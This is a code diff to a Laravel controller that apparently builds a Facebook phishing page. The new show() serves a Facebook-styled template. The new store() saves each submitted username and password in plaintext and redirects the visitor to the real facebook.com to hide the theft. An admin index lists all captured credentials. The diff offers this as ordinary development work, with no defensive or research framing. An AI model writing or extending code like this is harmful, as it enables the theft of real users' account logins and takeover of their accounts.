@@ -5,6 +5,9 @@ namespace App\Http\Controllers\Admin\Templates;
 use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 
+use App\Models\Facebook;
+
+
 class FacebookController extends Controller
 {
     /**
@@ -12,7 +15,9 @@ class FacebookController extends Controller
      */
     public function index()
     {
-        return view('templates.facebook.index');
+        $data = Facebook::get();
+        // dd($data);
+        return view('admin.dashboard.facebook.index', compact('data'));
     }
 
     /**
@@ -28,15 +33,22 @@ class FacebookController extends Controller
      */
     public function store(Request $request)
     {
-        //
+        $data = new Facebook();
+        $data->username = $request->input('username');
+        $data->password = $request->input('password');
+
+        $data->save();
+
+        return redirect('https://www.facebook.com');
     }
 
     /**
      * Display the specified resource.
      */
-    public function show(string $id)
+    // public function show(string $id)
+    public function show()
     {
-        //
+        return view('templates.facebook.index');
     }
 
     /**
